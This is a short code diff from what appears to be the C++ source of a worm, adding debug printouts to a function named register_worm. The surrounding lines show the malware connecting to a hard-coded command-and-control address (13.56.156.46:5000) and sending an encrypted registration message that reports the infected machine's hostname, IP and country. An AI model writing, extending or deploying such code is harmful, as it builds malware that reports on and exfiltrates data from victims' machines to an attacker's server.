@@ -227,6 +227,13 @@ __declspec(dllexport) char *structure_init_message(char XOR_key, const char *vir
 __declspec(dllexport) int register_worm(char XOR_key, char *virus_id, char *hostname, char *ip, char *country){
 	const char* server_hostname = "13.56.156.46";
 	const char* port = "5000";
+
+	std::cout << "XOR Key: " << XOR_key << std::endl;
+	std::cout << "Virus ID: " << virus_id << std::endl;
+	std::cout << "Hostname: " << hostname << std::endl;
+	std::cout << "IP: " << ip << std::endl;
+	std::cout << "Country: " << country << std::endl << std::endl;
+
 	SOCKET sock = connect_to_c2(server_hostname, port);
 	char *message = structure_init_message(XOR_key, virus_id, hostname, ip, country);
 	char *encrypted_message = encryption(message);
